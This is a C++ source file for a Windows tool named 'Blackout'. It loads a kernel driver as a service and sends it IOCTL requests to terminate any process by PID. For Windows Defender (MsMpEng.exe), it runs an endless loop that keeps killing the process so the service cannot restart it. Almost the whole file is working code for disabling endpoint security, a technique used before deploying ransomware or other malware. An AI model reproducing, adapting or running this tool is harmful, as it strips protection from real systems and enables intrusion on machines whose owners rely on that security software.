#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>

#define INITIALIZE_IOCTL_CODE 0x9876C004

#define TERMINSTE_PROCESS_IOCTL_CODE 0x9876C094

BOOL
LoadDriver(
    char* driverPath
)
{
    SC_HANDLE hSCM, hService;
    const char* serviceName = "Blackout";

    // Open a handle to the SCM database
    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) {
        printf("OpenSCManager failed %X\n", GetLastError());
        return (1);
    }

    // Check if the service already exists
    hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (hService != NULL)
    {
        printf("Service already exists.\n");

        // Start the service if it's not running
        SERVICE_STATUS serviceStatus;
        if (!QueryServiceStatus(hService, &serviceStatus))
        {
            printf("QueryServiceStatus failed %X\n", GetLastError());
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return (1);
        }

        if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
        {
            if (!StartServiceA(hService, 0, nullptr))
            {
                printf("StartService failed %X\n", GetLastError());
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                return (1);
            }

            printf("Starting service...\n");
        }

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return (0);
    }

    // Create the service
    hService = CreateServiceA(
        hSCM,
        serviceName,
        serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (hService == NULL) {
        printf("CreateService failed %X\n", GetLastError());
        CloseServiceHandle(hSCM);
        return (1);
    }

    printf("Service created successfully.\n");

    // Start the service
    if (!StartServiceA(hService, 0, nullptr))
    {
        printf("StartService failed %X\n", GetLastError());
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return (1);
    }

    printf("Starting service...\n");

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return (0);
}



BOOL
CheckProcess(
    DWORD pn)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (pE.th32ProcessID == pn)
                {
                    CloseHandle(hSnap);
                    return (1);
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return (0);
}

DWORD
GetPID(
    LPCWSTR pn)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!lstrcmpiW((LPCWSTR)pE.szExeFile, pn))
                {
                    procId = pE.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return (procId);
}


int
main(
    int argc,
    char** argv
) {

    if (argc != 3) {
        printf("Invalid number of arguments. Usage: Blackout.exe -p <process_id>\n");
        return (-1);
    }

    if (strcmp(argv[1], "-p") != 0) {
        printf("Invalid argument. Usage: Blackout.exe -p <process_id>\n");
        return (-1);
    }

    if (!CheckProcess(atoi(argv[2])))
    {
        printf("provided process id doesnt exist !!\n");
        return (-1);
    }


    WIN32_FIND_DATAA fileData;
    HANDLE hFind;
    char FullDriverPath[MAX_PATH];
    BOOL once = 1;

    hFind = FindFirstFileA("Blackout.sys", &fileData);

    if (hFind != INVALID_HANDLE_VALUE) { // file is found
        if (GetFullPathNameA(fileData.cFileName, MAX_PATH, FullDriverPath, NULL) != 0) { // full path is found
            printf("driver path: %s\n", FullDriverPath);
        }
        else {
            printf("path not found !!\n");
            return(-1);
        }
    }
    else {
        printf("driver not found !!\n");
        return(-1);
    }
    printf("Loading %s driver .. \n", fileData.cFileName);

    if (LoadDriver(FullDriverPath))
    {
        printf("faild to load driver ,try to run the program as administrator!!\n");
        return (-1);
    }

    printf("driver loaded successfully !!\n");

    HANDLE hDevice = CreateFile(L"\\\\.\\Blackout", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open handle to driver !! ");
        return (-1);
    }

    DWORD bytesReturned = 0;
    DWORD input = atoi(argv[2]);
    DWORD output[2] = { 0 };
    DWORD outputSize = sizeof(output);

    BOOL result = DeviceIoControl(hDevice, INITIALIZE_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL);
    if (!result)
    {
        printf("faild to send initializing request %X !!\n", INITIALIZE_IOCTL_CODE);
        return (-1);
    }

    printf("driver initialized %X !!\n", INITIALIZE_IOCTL_CODE);

    if (GetPID(L"MsMpEng.exe") == input)
    {
        printf("Terminating Windows Defender ..\nkeep the program running to prevent the service from restarting it\n");
        while (0x1)
        {
            if (input = GetPID(L"MsMpEng.exe"))
            {
                if (!DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL))
                {
                    printf("DeviceIoControl failed. Error: %X !!\n", GetLastError());
                    CloseHandle(hDevice);
                    return (-1);
                }
                if (once)
                {
                    printf("Defender Terminated ..\n");
                    once = 0;
                }

            }

            Sleep(700);
        }
    }

    printf("terminating process !! \n");

    result = DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL);

    if (!result)
    {
        printf("failed to terminate process: %X !!\n", GetLastError());
        CloseHandle(hDevice);
        return (-1);
    }

    printf("process has been terminated!\n");

    system("pause");

    CloseHandle(hDevice);

    return 0;
}
